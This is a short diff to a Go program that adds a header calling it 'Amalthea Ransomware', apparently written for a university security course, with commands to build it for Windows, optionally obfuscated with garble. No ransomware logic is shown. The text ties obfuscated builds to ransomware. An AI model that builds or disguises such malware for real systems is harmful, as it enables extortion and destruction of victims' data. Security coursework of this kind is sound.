@@ -1,5 +1,17 @@
 package main
 
+/*
+
+	Amalthea Ransomware.
+	Developer for IY3D602 - Advanced Systems Security
+
+	Use:
+		Obfuscated: `env GOOS=windows GOARCH=amd64 garble build .`
+		Obfuscated with no logging: `env GOOS=windows GOARCH=amd64 garble -tiny build .`
+		Normal: `env GOOS=windows GOARCH=amd64 go build .`
+
+*/
+
 // Import all the required packages
 import (
 	"fmt"
